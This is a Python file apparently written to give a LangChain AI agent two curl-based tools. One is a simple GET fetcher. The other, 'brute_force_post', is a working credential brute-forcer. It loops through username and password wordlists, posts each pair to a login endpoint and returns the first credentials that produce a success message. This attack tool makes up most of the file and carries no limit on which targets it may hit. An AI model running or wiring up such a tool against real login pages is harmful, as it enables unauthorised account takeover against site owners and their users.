import subprocess

from langchain_core.tools import tool


@tool
def curl_get(url: str):
    """
    Perform a GET request using curl.

    Args:
        url (str): The URL to fetch data from.

    Returns:
        str: The response body from the GET request.
    """
    # Construct the curl command
    command = ["curl", "-s", url]
    try:
        # Execute the curl command and capture its output
        result = subprocess.run(command, capture_output=True, text=True)
        if result.returncode == 0:
            # If the command was successful, return the response
            return f"Response:\n{result.stdout.strip()}"
        else:
            # If there was an error, return the error message
            return f"Error fetching URL. {result.stderr.strip()}"
    except Exception as e:
        # If an exception occurred, return the error message
        return f"Command error: {str(e)}"


@tool
def brute_force_post(
    url: str, users_file: str, passwords_file: str, success_message: str
):
    """
    Perform a brute-force attack on a POST authentication endpoint using curl.

    Args:
        url (str): The URL of the authentication endpoint.
        users_file (str): Path to the file containing usernames (one per line).
        passwords_file (str): Path to the file containing passwords (one per line).
        success_message (str): The message indicating successful authentication.

    Returns:
        str: Success message with valid credentials or a failure message.
    """
    try:
        # Read usernames and passwords from files
        with open(users_file, "r") as uf, open(passwords_file, "r") as pf:
            users = [line.strip() for line in uf]
            passwords = [line.strip() for line in pf]

        # Iterate through all combinations of usernames and passwords
        for user in users:
            for password in passwords:
                # Prepare the JSON payload
                payload = f'{{"username":"{user}", "password":"{password}"}}'
                # Construct the curl command
                command = [
                    "curl",
                    "-s",
                    "-X",
                    "POST",
                    url,
                    "-H",
                    "Content-Type: application/json",
                    "-d",
                    payload,
                ]

                # Execute the curl command and capture its output
                result = subprocess.run(command, capture_output=True, text=True)

                # Check if the success message is in the response
                if success_message in result.stdout:
                    return f"Success! Valid credentials found:\nUsername: {user}\nPassword: {password}"

        # If no valid credentials were found
        return "Brute-force attempt completed. No valid credentials found."
    except Exception as e:
        # If an exception occurred, return the error message
        return f"An error occurred: {str(e)}"


# List of curl-related tools available for use
curl_tools = [curl_get, brute_force_post]
